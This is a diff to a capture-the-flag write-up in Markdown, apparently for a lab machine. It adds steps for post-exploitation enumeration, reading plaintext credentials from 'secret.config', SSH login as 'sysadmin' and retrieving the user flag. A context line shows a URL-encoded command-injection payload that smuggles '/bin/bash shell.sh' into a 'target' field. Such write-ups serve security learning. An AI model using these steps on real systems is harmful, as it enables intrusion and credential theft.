@@ -169,6 +169,51 @@ target=localhost%0A+/bin/bash+shell.sh
 ```
 <img alt="image" src="https://github.com/user-attachments/assets/5a6848b2-9f1e-4493-a864-f41593ddb853" />
 
+### 📂 Local Enumeration & Inspecting File Permissions
+
+Once access was established as `www-data`, I performed post-exploitation enumeration in the current working directory `/opt/netops`:
+
+```bash
+id
+groups
+ls -la
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 36 45" src="https://github.com/user-attachments/assets/b3d87d8d-5f4e-4583-8a32-5f0ac9b11a41" />
+
+### 🔑 Extracting Sensitive Credentials
+
+Reading `secret.config` revealed database paths, internal SMTP details, and hardcoded service account credentials left in plain text:
+
+```bash
+cat secret.config
+```
+<img alt="image" src="https://github.com/user-attachments/assets/e92b51d4-ca73-4aae-b853-cdbd1fd63a72" />
+
+### 🔑 Horizontal Privilege Escalation via SSH
+
+With SSH open on port **22** (as discovered during initial Nmap reconnaissance) and valid credentials found in `secret.config`, I authenticated as the `sysadmin` user:
+
+```bash
+ssh sysadmin@10.112.173.195
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 40 47" src="https://github.com/user-attachments/assets/9333a0c7-7ef2-4edf-b689-d9e063ec9cdd" />
+<img alt="Zrzut ekranu 2026-09-6 o 16 41 07" src="https://github.com/user-attachments/assets/bdd107a5-3921-473e-8d60-569db0be5c2f" />
+
+### 🚩 User Flag Retrieval
+
+Upon logging in as `sysadmin`, I landed in its home directory (`/home/sysadmin`) and immediately listed the file contents to locate the first flag.
+
+```bash
+pwd
+ls
+cat user.txt
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 42 27" src="https://github.com/user-attachments/assets/11b36fb3-48af-4c55-b2a1-7fe56ec2271d" />
+
+
+
+
+
 
 
 
